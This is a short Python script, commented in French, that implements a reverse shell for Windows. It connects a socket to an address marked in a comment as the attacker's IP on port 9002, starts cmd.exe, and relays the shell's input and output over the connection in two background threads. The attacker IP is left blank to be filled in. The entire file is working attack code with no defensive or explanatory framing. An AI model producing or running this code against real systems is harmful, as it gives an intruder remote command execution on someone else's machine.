import os
import socket
import subprocess
import threading

def s2p(s, p):
    try:
        while True:
            data = s.recv(1024)
            if len(data) > 0:
                p.stdin.write(data)
                p.stdin.flush()
    except Exception as e:
        print(f"Error in s2p: {e}")
        s.close()

def p2s(s, p):
    try:
        while True:
            s.send(p.stdout.read(1))
    except Exception as e:
        print(f"Error in p2s: {e}")
        s.close()

def main():
    #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Pour TCP
    # Pour UDP, utiliser :
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    try:
        s.connect(("", 9002))  # Adresse IP et port de l'attaquant
    except Exception as e:
        print(f"Error connecting: {e}")
        return

    # Utiliser cmd.exe pour Windows
    p = subprocess.Popen(["cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

    s2p_thread = threading.Thread(target=s2p, args=(s, p))
    s2p_thread.daemon = True
    s2p_thread.start()

    p2s_thread = threading.Thread(target=p2s, args=(s, p))
    p2s_thread.daemon = True
    p2s_thread.start()

    try:
        p.wait()
    except KeyboardInterrupt:
        s.close()

if __name__ == "__main__":
    main()
